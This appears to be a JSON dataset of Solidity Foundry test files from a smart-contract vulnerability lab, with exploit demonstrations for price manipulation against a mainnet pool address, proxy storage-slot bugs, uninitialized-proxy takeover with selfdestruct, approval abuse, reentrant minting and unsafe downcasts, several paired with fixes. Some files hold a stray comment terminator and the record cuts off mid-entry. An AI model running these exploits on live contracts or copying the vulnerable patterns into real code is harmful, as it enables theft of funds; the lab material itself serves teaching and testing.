[
  {
    "id": "sample_3_0000",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// this excersise is about direct token manipulation\n\ninterface ISpace {\n    function onSwap(\n        SwapRequest memory request,\n        uint256 reservesTokenIn,\n        uint256 reservesTokenOut\n    ) external returns (uint256);\n\n    struct SwapRequest {\n        IVault.SwapKind kind;\n        IERC20 tokenIn;\n        IERC20 tokenOut;\n        uint256 amount;\n        // Misc data\n        bytes32 poolId;\n        uint256 lastChangeBlock;\n        address from;\n        address to;\n        bytes userData;\n    }\n}\n\ninterface IVault {\n    enum SwapKind {\n        GIVEN_IN,\n        GIVEN_OUT\n    }\n}\n\ncontract ContractTest is DSTest {\n    ISpace space = ISpace(0x3f9FEe026fCebb40719A69416C72B714d89a17d9);\n    IVault.SwapKind kind = IVault.SwapKind(0);\n    ISpace.SwapRequest aad =\n        ISpace.SwapRequest(\n            kind,\n            IERC20(0x3f9FEe026fCebb40719A69416C72B714d89a17d9),\n            IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0),\n            2000000000000000000,\n            0x3f9fee026fcebb40719a69416c72b714d89a17d900020000000000000000017c,\n            15017009,\n            address(this),\n            address(this),\n            \"\"\n        );\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 15017009); //fork mainnet at block 15017009\n    }\n\n    function testExploit() public {\n        //onswap:reservesTokenIn, reservesTokenOut;\n        console.log(\n            \"Amount Calculated:\",\n            space.onSwap(\n                aad,\n                60000000000000000000000000000000,\n                20000000000000000000000000\n            )\n        ); //744039785002747962\n        console.log(\n            \"Manipulated Amount Calculated:\",\n            space.onSwap(aad, 2000000000000000000, 2000000000000000000)\n        ); //1860147027671744844\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 3,
    "context_level": "intra_contract"
  },
  {
    "id": "sample_3_0001",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/utils/Address.sol\";\nimport \"@openzeppelin/contracts/utils/StorageSlot.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/proxy/utils/Initializable.sol\";\n\n//#SpotTheBugChallenge\n//https://twitter.com/immunefi/status/1562858386244665348?s=21&t=d7_HtNra5AGuNmzVtv9uKg\ninterface imp {\n    function initialize(address) external;\n}\n\ncontract ContractTest is Test {\n    Proxy ProxyContract;\n    Implementation ImplementationContract;\n\n    function testChallenge() public {\n        ImplementationContract = new Implementation();\n        console.log(\n            \"ImplementationContract addr\",\n            address(ImplementationContract)\n        );\n        ProxyContract = new Proxy(address(ImplementationContract));\n\n        emit log_named_bytes32(\n            \"Storage slot 0:\",\n            vm.load(address(ProxyContract), bytes32(uint256(0)))\n        );\n    }\n}\n\ncontract Proxy {\n    //bytes32 constant internal _IMPLEMENTATION_SLOT = keccak256(\"where.bug.ser\");  //correct pattern.\n    bytes32 internal _IMPLEMENTATION_SLOT = keccak256(\"where.bug.ser\"); // wrong\n\n    constructor(address implementation) {\n        _setImplementation(address(0));\n        Address.functionDelegateCall(\n            implementation,\n            abi.encodeWithSignature(\"initialize(address)\", msg.sender)\n        );\n    }\n\n    fallback() external payable {\n        address implementation = _getImplementation();\n        Address.functionDelegateCall(implementation, msg.data);\n    }\n\n    function _setImplementation(address newImplementation) private {\n        //require(Address.isContract(newImplementation), \"ERC1967: new implementation is not a contract\");\n        StorageSlot\n            .getAddressSlot(_IMPLEMENTATION_SLOT)\n            .value = newImplementation;\n    }\n\n    function _getImplementation() public view returns (address) {\n        return StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value;\n    }\n}\n\ncontract Implementation is Ownable, Initializable {\n    // function initialize(address owner) external {    //test purpose\n    function initialize(address owner) external initializer {\n        _transferOwnership(owner);\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 3,
    "context_level": "intra_contract"
  },
  {
    "id": "sample_3_0002",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n*/\n\ncontract ContractTest is Test {\n    STA STAContract;\n    VulnVault VulnVaultContract;\n    Vault VaultContract;\n\n    function setUp() public {\n        STAContract = new STA();\n        VulnVaultContract = new VulnVault(address(STAContract));\n        VaultContract = new Vault(address(STAContract));\n    }\n\n    function testVulnFeeOnTransfer() public {\n        address alice = vm.addr(1);\n        address bob = vm.addr(2);\n        STAContract.balanceOf(address(this));\n        STAContract.transfer(alice, 1000000);\n        console.log(\"Alice's STA balance:\", STAContract.balanceOf(alice)); // charge 1% fee\n        vm.startPrank(alice);\n        STAContract.approve(address(VulnVaultContract), type(uint256).max);\n        VulnVaultContract.deposit(10000);\n        //VulnVaultContract.getBalance(alice);\n\n        console.log(\n            \"Alice deposit 10000 STA, but Alice's STA balance in VulnVaultContract:\",\n            VulnVaultContract.getBalance(alice)\n        ); // charge 1% fee\n        assertEq(\n            STAContract.balanceOf(address(VulnVaultContract)),\n            VulnVaultContract.getBalance(alice)\n        );\n    }\n\n    function testFeeOnTransfer() public {\n        address alice = vm.addr(1);\n        address bob = vm.addr(2);\n        STAContract.balanceOf(address(this));\n        STAContract.transfer(alice, 1000000);\n        console.log(\"Alice's STA balance:\", STAContract.balanceOf(alice)); // charge 1% fee\n        vm.startPrank(alice);\n        STAContract.approve(address(VaultContract), type(uint256).max);\n        VaultContract.deposit(10000);\n        //VaultContract.getBalance(alice);\n\n        console.log(\n            \"Alice deposit 10000, Alice's STA balance in VaultContract:\",\n            VaultContract.getBalance(alice)\n        ); // charge 1% fee\n        assertEq(\n            STAContract.balanceOf(address(VaultContract)),\n            VaultContract.getBalance(alice)\n        );\n    }\n\n    receive() external payable {}\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address who) external view returns (uint256);\n\n    function allowance(\n        address owner,\n        address spender\n    ) external view returns (uint256);\n\n    function transfer(address to, uint256 value) external returns (bool);\n\n    function approve(address spender, uint256 value) external returns (bool);\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 value\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n}\n\nlibrary SafeMath {\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n        uint256 c = a * b;\n        assert(c / a == b);\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a / b;\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        assert(b <= a);\n        return a - b;\n    }\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        assert(c >= a);\n        return c;\n    }\n\n    function ceil(uint256 a, uint256 m) internal pure returns (uint256) {\n        uint256 c = add(a, m);\n        uint256 d = sub(c, 1);\n        return mul(div(d, m), m);\n    }\n}\n\nabstract contract ERC20Detailed is IERC20 {\n    string private _name;\n    string private _symbol;\n    uint8 private _decimals;\n\n    constructor(\n        string memory name,\n        string memory symbol,\n        uint8 decimals\n    ) internal {\n        _name = name;\n        _symbol = symbol;\n        _decimals = decimals;\n    }\n\n    function name() public view returns (string memory) {\n        return _name;\n    }\n\n    function symbol() public view returns (string memory) {\n        return _symbol;\n    }\n\n    function decimals() public view returns (uint8) {\n        return _decimals;\n    }\n}\n\ncontract STA is ERC20Detailed {\n    using SafeMath for uint256;\n    mapping(address => uint256) private _balances;\n    mapping(address => mapping(address => uint256)) private _allowed;\n\n    string constant tokenName = \"Statera\";\n    string constant tokenSymbol = \"STA\";\n    uint8 constant tokenDecimals = 18;\n    uint256 _totalSupply = 100000000000000000000000000;\n    uint256 public basePercent = 100;\n\n    constructor()\n        public\n        payable\n        ERC20Detailed(tokenName, tokenSymbol, tokenDecimals)\n    {\n        _issue(msg.sender, _totalSupply);\n    }\n\n    function totalSupply() public view returns (uint256) {\n        return _totalSupply;\n    }\n\n    function balanceOf(address owner) public view returns (uint256) {\n        return _balances[owner];\n    }\n\n    function allowance(\n        address owner,\n        address spender\n    ) public view returns (uint256) {\n        return _allowed[owner][spender];\n    }\n\n    function cut(uint256 value) public view returns (uint256) {\n        uint256 roundValue = value.ceil(basePercent);\n        uint256 cutValue = roundValue.mul(basePercent).div(10000);\n        return cutValue;\n    }\n\n    function transfer(address to, uint256 value) public returns (bool) {\n        require(value <= _balances[msg.sender]);\n        require(to != address(0));\n\n        uint256 tokensToBurn = cut(value);\n        uint256 tokensToTransfer = value.sub(tokensToBurn);\n\n        _balances[msg.sender] = _balances[msg.sender].sub(value);\n        _balances[to] = _balances[to].add(tokensToTransfer);\n\n        _totalSupply = _totalSupply.sub(tokensToBurn);\n\n        emit Transfer(msg.sender, to, tokensToTransfer);\n        emit Transfer(msg.sender, address(0), tokensToBurn);\n        return true;\n    }\n\n    function approve(address spender, uint256 value) public returns (bool) {\n        require(spender != address(0));\n        _allowed[msg.sender][spender] = value;\n        emit Approval(msg.sender, spender, value);\n        return true;\n    }\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 value\n    ) public returns (bool) {\n        require(value <= _balances[from]);\n        require(value <= _allowed[from][msg.sender]);\n        require(to != address(0));\n\n        _balances[from] = _balances[from].sub(value);\n\n        uint256 tokensToBurn = cut(value);\n        uint256 tokensToTransfer = value.sub(tokensToBurn);\n\n        _balances[to] = _balances[to].add(tokensToTransfer);\n        _totalSupply = _totalSupply.sub(tokensToBurn);\n\n        _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);\n\n        emit Transfer(from, to, tokensToTransfer);\n        emit Transfer(from, address(0), tokensToBurn);\n\n        return true;\n    }\n\n    function upAllowance(\n        address spender,\n        uint256 addedValue\n    ) public returns (bool) {\n        require(spender != address(0));\n        _allowed[msg.sender][spender] = (\n            _allowed[msg.sender][spender].add(addedValue)\n        );\n        emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);\n        return true;\n    }\n\n    function downAllowance(\n        address spender,\n        uint256 subtractedValue\n    ) public returns (bool) {\n        require(spender != address(0));\n        _allowed[msg.sender][spender] = (\n            _allowed[msg.sender][spender].sub(subtractedValue)\n        );\n        emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);\n        return true;\n    }\n\n    function _issue(address account, uint256 amount) internal {\n        require(amount != 0);\n        _balances[account] = _balances[account].add(amount);\n        emit Transfer(address(0), account, amount);\n    }\n\n    function destroy(uint256 amount) external {\n        _destroy(msg.sender, amount);\n    }\n\n    function _destroy(address account, uint256 amount) internal {\n        require(amount != 0);\n        require(amount <= _balances[account]);\n        _totalSupply = _totalSupply.sub(amount);\n        _balances[account] = _balances[account].sub(amount);\n        emit Transfer(account, address(0), amount);\n    }\n\n    function destroyFrom(address account, uint256 amount) external {\n        require(amount <= _allowed[account][msg.sender]);\n        _allowed[account][msg.sender] = _allowed[account][msg.sender].sub(\n            amount\n        );\n        _destroy(account, amount);\n    }\n}\n\n//vulnerable vault\ncontract VulnVault {\n    mapping(address => uint256) private balances;\n    uint256 private fee;\n    IERC20 private token;\n\n    event Deposit(address indexed depositor, uint256 amount);\n    event Withdrawal(address indexed recipient, uint256 amount);\n\n    constructor(address _tokenAddress) {\n        token = IERC20(_tokenAddress);\n    }\n\n    function deposit(uint256 amount) external {\n        require(amount > 0, \"Deposit amount must be greater than zero\");\n\n        token.transferFrom(msg.sender, address(this), amount);\n        balances[msg.sender] += amount;\n        emit Deposit(msg.sender, amount);\n    }\n\n    function withdraw(uint256 amount) external {\n        require(amount > 0, \"Withdrawal amount must be greater than zero\");\n        require(amount <= balances[msg.sender], \"Insufficient balance\");\n\n        balances[msg.sender] -= amount;\n        token.transfer(msg.sender, amount);\n        emit Withdrawal(msg.sender, amount);\n    }\n\n    function getBalance(address account) external view returns (uint256) {\n        return balances[account];\n    }\n}\n\n//Mitigated vault\ncontract Vault {\n    mapping(address => uint256) private balances;\n    uint256 private fee;\n    IERC20 private token;\n\n    event Deposit(address indexed depositor, uint256 amount);\n    event Withdrawal(address indexed recipient, uint256 amount);\n\n    constructor(address _tokenAddress) {\n        token = IERC20(_tokenAddress);\n    }\n\n    function deposit(uint256 amount) external {\n        require(amount > 0, \"Deposit amount must be greater than zero\");\n\n        uint256 balanceBefore = token.balanceOf(address(this));\n\n        token.transferFrom(msg.sender, address(this), amount);\n\n        uint256 balanceAfter = token.balanceOf(address(this));\n        uint256 actualDepositAmount = balanceAfter - balanceBefore;\n\n        balances[msg.sender] += actualDepositAmount;\n        emit Deposit(msg.sender, actualDepositAmount);\n    }\n\n    function withdraw(uint256 amount) external {\n        require(amount > 0, \"Withdrawal amount must be greater than zero\");\n        require(amount <= balances[msg.sender], \"Insufficient balance\");\n\n        balances[msg.sender] -= amount;\n        token.transfer(msg.sender, amount);\n        emit Withdrawal(msg.sender, amount);\n    }\n\n    function getBalance(address account) external view returns (uint256) {\n        return balances[account];\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 3,
    "context_level": "intra_contract"
  },
  {
    "id": "sample_3_0003",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n*/\n\ncontract ContractTest is Test {\n    ERC20 ERC20Contract;\n    address alice = vm.addr(1);\n    address eve = vm.addr(2);\n\n    function testApproveScam() public {\n        ERC20Contract = new ERC20();\n        ERC20Contract.mint(1000);\n        ERC20Contract.transfer(address(alice), 1000);\n\n        vm.prank(alice);\n        // Be Careful to grant unlimited amount to unknown website/address.\n        // Do not perform approve, if you are sure it's from a legitimate website.\n        // Alice granted approval permission to Eve.\n        ERC20Contract.approve(address(eve), type(uint256).max);\n\n        console.log(\n            \"Before exploiting, Balance of Eve:\",\n            ERC20Contract.balanceOf(eve)\n        );\n        console.log(\n            \"Due to Alice granted transfer permission to Eve, now Eve can move funds from Alice\"\n        );\n        vm.prank(eve);\n        // Now, Eve can move funds from Alice.\n        ERC20Contract.transferFrom(address(alice), address(eve), 1000);\n        console.log(\n            \"After exploiting, Balance of Eve:\",\n            ERC20Contract.balanceOf(eve)\n        );\n        console.log(\"Exploit completed\");\n    }\n\n    receive() external payable {}\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint);\n\n    function balanceOf(address account) external view returns (uint);\n\n    function transfer(address recipient, uint amount) external returns (bool);\n\n    function allowance(\n        address owner,\n        address spender\n    ) external view returns (uint);\n\n    function approve(address spender, uint amount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint amount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint value);\n    event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract ERC20 is IERC20 {\n    uint public totalSupply;\n    mapping(address => uint) public balanceOf;\n    mapping(address => mapping(address => uint)) public allowance;\n    string public name = \"Test example\";\n    string public symbol = \"Test\";\n    uint8 public decimals = 18;\n\n    function transfer(address recipient, uint amount) external returns (bool) {\n        balanceOf[msg.sender] -= amount;\n        balanceOf[recipient] += amount;\n        emit Transfer(msg.sender, recipient, amount);\n        return true;\n    }\n\n    function approve(address spender, uint amount) external returns (bool) {\n        allowance[msg.sender][spender] = amount;\n        emit Approval(msg.sender, spender, amount);\n        return true;\n    }\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint amount\n    ) external returns (bool) {\n        allowance[sender][msg.sender] -= amount;\n        balanceOf[sender] -= amount;\n        balanceOf[recipient] += amount;\n        emit Transfer(sender, recipient, amount);\n        return true;\n    }\n\n    function mint(uint amount) external {\n        balanceOf[msg.sender] += amount;\n        totalSupply += amount;\n        emit Transfer(address(0), msg.sender, amount);\n    }\n\n    function burn(uint amount) external {\n        balanceOf[msg.sender] -= amount;\n        totalSupply -= amount;\n        emit Transfer(msg.sender, address(0), amount);\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 3,
    "context_level": "intra_contract"
  },
  {
    "id": "sample_3_0004",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n*/\n\ncontract ContractTest is Test {\n    SimplePool SimplePoolContract;\n\n    function setUp() public {\n        SimplePoolContract = new SimplePool();\n    }\n\n    function testRounding_error() public view {\n        SimplePoolContract.getCurrentReward();\n    }\n\n    receive() external payable {}\n}\n\ncontract SimplePool {\n    uint public totalDebt;\n    uint public lastAccrueInterestTime;\n    uint public loanTokenBalance;\n\n    constructor() {\n        totalDebt = 10000e6; //debt token is USDC and has 6 digit decimals.\n        lastAccrueInterestTime = block.timestamp - 1;\n        loanTokenBalance = 500e18;\n    }\n\n    function getCurrentReward() public view returns (uint _reward) {\n        // Get the time passed since the last interest accrual\n        uint _timeDelta = block.timestamp - lastAccrueInterestTime; //_timeDelta=1\n\n        // If the time passed is 0, return 0 reward\n        if (_timeDelta == 0) return 0;\n\n        // Calculate the supplied value\n        // uint _supplied = totalDebt + loanTokenBalance;\n        //console.log(_supplied);\n        // Calculate the reward\n        _reward = (totalDebt * _timeDelta) / (365 days * 1e18);\n        console.log(\"Current reward\", _reward);\n\n        // 31536000 is the number of seconds in a year\n        // 365 days * 1e18 = 31_536_000_000_000_000_000_000_000\n        //_totalDebt * _timeDelta / 31_536_000_000_000_000_000_000_000\n        // 10_000_000_000 * 1 / 31_536_000_000_000_000_000_000_000 // -> 0\n        _reward;\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 3,
    "context_level": "intra_contract"
  },
  {
    "id": "sample_3_0005",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/utils/Address.sol\";\nimport \"@openzeppelin/contracts/proxy/utils/Initializable.sol\";\n\n*/\n\ncontract ContractTest is Test {\n    Engine EngineContract;\n    Motorbike MotorbikeContract;\n    Attack AttackContract;\n\n    function testUninitialized() public {\n        EngineContract = new Engine();\n        MotorbikeContract = new Motorbike(address(EngineContract));\n        AttackContract = new Attack();\n\n        // Engine contract is not initialized\n        console.log(\"Unintialized Upgrader:\", EngineContract.upgrader());\n        // Malicious user calls initialize() on Engine contract to become upgrader.\n        address(EngineContract).call(abi.encodeWithSignature(\"initialize()\"));\n        // Malicious user becomes the upgrader\n        console.log(\"Initialized Upgrader:\", EngineContract.upgrader());\n\n        bytes memory initEncoded = abi.encodeWithSignature(\"attack()\");\n        address(EngineContract).call(\n            abi.encodeWithSignature(\n                \"upgradeToAndCall(address,bytes)\",\n                address(AttackContract),\n                initEncoded\n            )\n        );\n\n        console.log(\"Exploit completed\");\n        console.log(\"Since EngineContract destroyed, next call will fail.\");\n        address(EngineContract).call(\n            abi.encodeWithSignature(\n                \"upgradeToAndCall(address,bytes)\",\n                address(AttackContract),\n                initEncoded\n            )\n        );\n    }\n}\n\ncontract Motorbike {\n    // keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1\n    bytes32 internal constant _IMPLEMENTATION_SLOT =\n        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n\n    struct AddressSlot {\n        address value;\n    }\n\n    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.\n    constructor(address _logic) {\n        require(\n            Address.isContract(_logic),\n            \"ERC1967: new implementation is not a contract\"\n        );\n        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;\n        (bool success, ) = _logic.delegatecall(\n            abi.encodeWithSignature(\"initialize()\")\n        );\n        require(success, \"Call failed\");\n    }\n\n    // Delegates the current call to `implementation`.\n    function _delegate(address implementation) internal virtual {\n        // solhint-disable-next-line no-inline-assembly\n        assembly {\n            calldatacopy(0, 0, calldatasize())\n            let result := delegatecall(\n                gas(),\n                implementation,\n                0,\n                calldatasize(),\n                0,\n                0\n            )\n            returndatacopy(0, 0, returndatasize())\n            switch result\n            case 0 {\n                revert(0, returndatasize())\n            }\n            default {\n                return(0, returndatasize())\n            }\n        }\n    }\n\n    // Fallback function that delegates calls to the address returned by `_implementation()`.\n    // Will run if no other function in the contract matches the call data\n    fallback() external payable virtual {\n        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);\n    }\n\n    // Returns an `AddressSlot` with member `value` located at `slot`.\n    function _getAddressSlot(\n        bytes32 slot\n    ) internal pure returns (AddressSlot storage r) {\n        assembly {\n            r.slot := slot\n        }\n    }\n}\n\ncontract Engine is Initializable {\n    // keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1\n    bytes32 internal constant _IMPLEMENTATION_SLOT =\n        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n\n    address public upgrader;\n    uint256 public horsePower;\n\n    struct AddressSlot {\n        address value;\n    }\n\n    function initialize() external initializer {\n        horsePower = 1000;\n        upgrader = msg.sender;\n    }\n\n    // Upgrade the implementation of the proxy to `newImplementation`\n    // subsequently execute the function call\n    function upgradeToAndCall(\n        address newImplementation,\n        bytes memory data\n    ) external payable {\n        _authorizeUpgrade();\n        _upgradeToAndCall(newImplementation, data);\n    }\n\n    // Restrict to upgrader role\n    function _authorizeUpgrade() internal view {\n        require(msg.sender == upgrader, \"Can't upgrade\");\n    }\n\n    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.\n    function _upgradeToAndCall(\n        address newImplementation,\n        bytes memory data\n    ) internal {\n        // Initial upgrade and setup call\n        _setImplementation(newImplementation);\n        if (data.length > 0) {\n            (bool success, ) = newImplementation.delegatecall(data);\n            require(success, \"Call failed\");\n        }\n    }\n\n    event Returny(uint256);\n\n    function greetMe() public {\n        emit Returny(0x42);\n    }\n\n    // Stores a new address in the EIP1967 implementation slot.\n    function _setImplementation(address newImplementation) private {\n        require(\n            Address.isContract(newImplementation),\n            \"ERC1967: new implementation is not a contract\"\n        );\n\n        AddressSlot storage r;\n        assembly {\n            r.slot := _IMPLEMENTATION_SLOT\n        }\n        r.value = newImplementation;\n    }\n}\n\ncontract Attack {\n    function attack() external {\n        selfdestruct(payable(msg.sender));\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 3,
    "context_level": "intra_contract"
  },
  {
    "id": "sample_3_0006",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n// Import the SafeCast library\nimport \"@openzeppelin/contracts/utils/math/SafeCast.sol\";\n\n*/\n\ncontract ContractTest is Test {\n    SimpleBank SimpleBankContract;\n    FixedSimpleBank FixedSimpleBankContract;\n\n    function setUp() public {\n        SimpleBankContract = new SimpleBank();\n        FixedSimpleBankContract = new FixedSimpleBank();\n    }\n\n    function testUnsafeDowncast() public {\n        SimpleBankContract.deposit(257); //overflowed\n\n        console.log(\n            \"balance of SimpleBankContract:\",\n            SimpleBankContract.getBalance()\n        );\n\n        // balance is 1, because of overflowed\n        assertEq(SimpleBankContract.getBalance(), 1);\n    }\n\n    function testsafeDowncast() public {\n        vm.expectRevert(\"SafeCast: value doesn't fit in 8 bits\");\n        FixedSimpleBankContract.deposit(257); //revert\n    }\n\n    receive() external payable {}\n}\n\ncontract SimpleBank {\n    mapping(address => uint) private balances;\n\n    function deposit(uint256 amount) public {\n        // Here's the unsafe downcast. If the `amount` is greater than type(uint8).max\n        // (which is 255), then only the least significant 8 bits are stored in balance.\n        // This could lead to unexpected results due to overflow.\n        uint8 balance = uint8(amount);\n\n        // store the balance\n        balances[msg.sender] = balance;\n    }\n\n    function getBalance() public view returns (uint) {\n        return balances[msg.sender];\n    }\n}\n\ncontract FixedSimpleBank {\n    using SafeCast for uint256; // Use SafeCast for uint256\n\n    mapping(address => uint) private balances;\n\n    function deposit(uint256 _amount) public {\n        // Use the `toUint8()` function from `SafeCast` to safely downcast `amount`.\n        // If `amount` is greater than `type(uint8).max`, it will revert.\n        // or keep the same uint256 with amount.\n        uint8 amount = _amount.toUint8(); // or keep uint256\n\n        // Store the balance\n        balances[msg.sender] = amount;\n    }\n\n    function getBalance() public view returns (uint) {\n        return balances[msg.sender];\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 3,
    "context_level": "intra_contract"
  },
  {
    "id": "sample_3_0007",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n*/\n\ncontract ContractTest is Test {\n    StructDeletionBug StructDeletionBugContract;\n    FixedStructDeletion FixedStructDeletionContract;\n\n    function setUp() public {\n        StructDeletionBugContract = new StructDeletionBug();\n        FixedStructDeletionContract = new FixedStructDeletion();\n    }\n\n    function testStructDeletion() public {\n        StructDeletionBugContract.addStruct(10, 10);\n        StructDeletionBugContract.getStruct(10, 10);\n        StructDeletionBugContract.deleteStruct(10);\n        StructDeletionBugContract.getStruct(10, 10);\n    }\n\n    function testFixedStructDeletion() public {\n        FixedStructDeletionContract.addStruct(10, 10);\n        FixedStructDeletionContract.getStruct(10, 10);\n        FixedStructDeletionContract.deleteStruct(10);\n        FixedStructDeletionContract.getStruct(10, 10);\n    }\n\n    receive() external payable {}\n}\n\ncontract StructDeletionBug {\n    struct MyStruct {\n        uint256 id;\n        mapping(uint256 => bool) flags;\n    }\n\n    mapping(uint256 => MyStruct) public myStructs;\n\n    function addStruct(uint256 structId, uint256 flagKeys) public {\n        MyStruct storage newStruct = myStructs[structId];\n        newStruct.id = structId;\n        newStruct.flags[flagKeys] = true;\n    }\n\n    function getStruct(\n        uint256 structId,\n        uint256 flagKeys\n    ) public view returns (uint256, bool) {\n        MyStruct storage myStruct = myStructs[structId];\n        bool keys = myStruct.flags[flagKeys];\n        return (myStruct.id, keys);\n    }\n\n    function deleteStruct(uint256 structId) public {\n        MyStruct storage myStruct = myStructs[structId];\n        delete myStructs[structId];\n    }\n}\n\ncontract FixedStructDeletion {\n    struct MyStruct {\n        uint256 id;\n        mapping(uint256 => bool) flags;\n    }\n\n    mapping(uint256 => MyStruct) public myStructs;\n\n    function addStruct(uint256 structId, uint256 flagKeys) public {\n        MyStruct storage newStruct = myStructs[structId];\n        newStruct.id = structId;\n        newStruct.flags[flagKeys] = true;\n    }\n\n    function getStruct(\n        uint256 structId,\n        uint256 flagKeys\n    ) public view returns (uint256, bool) {\n        MyStruct storage myStruct = myStructs[structId];\n        bool keys = myStruct.flags[flagKeys];\n        return (myStruct.id, keys);\n    }\n\n    function deleteStruct(uint256 structId) public {\n        MyStruct storage myStruct = myStructs[structId];\n        // Check if all flags are deleted, then delete the mapping\n        for (uint256 i = 0; i < 15; i++) {\n            delete myStruct.flags[i];\n        }\n        delete myStructs[structId];\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 3,
    "context_level": "intra_contract"
  },
  {
    "id": "sample_3_0008",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol\";\n\n*/\n\ncontract ContractTest is Test {\n    MaxMint721 MaxMint721Contract;\n    bool complete;\n    uint256 maxMints = 10;\n    address alice = vm.addr(1);\n    address eve = vm.addr(2);\n\n    function testSafeMint() public {\n        MaxMint721Contract = new MaxMint721();\n        MaxMint721Contract.mint(maxMints);\n        console.log(\"Bypassed maxMints, we got 19 NFTs\");\n        assertEq(MaxMint721Contract.balanceOf(address(this)), 19);\n        console.log(\"NFT minted:\", MaxMint721Contract.balanceOf(address(this)));\n    }\n\n    function onERC721Received(\n        address,\n        address,\n        uint256,\n        bytes memory\n    ) public returns (bytes4) {\n        if (!complete) {\n            complete = true;\n            MaxMint721Contract.mint(maxMints - 1);\n            console.log(\"Called with :\", maxMints - 1);\n        }\n        return this.onERC721Received.selector;\n    }\n\n    receive() external payable {}\n}\n\ncontract MaxMint721 is ERC721Enumerable {\n    uint256 public MAX_PER_USER = 10;\n\n    constructor() ERC721(\"ERC721\", \"ERC721\") {}\n\n    function mint(uint256 amount) external {\n        require(\n            balanceOf(msg.sender) + amount <= MAX_PER_USER,\n            \"exceed max per user\"\n        );\n        for (uint256 i = 0; i < amount; i++) {\n            uint256 mintIndex = totalSupply();\n            _safeMint(msg.sender, mintIndex);\n        }\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 3,
    "context_level": "intra_contract"
  },
  {
    "id": "sample_3_0009",
    "language": "solidity",
    "chain": "evm",
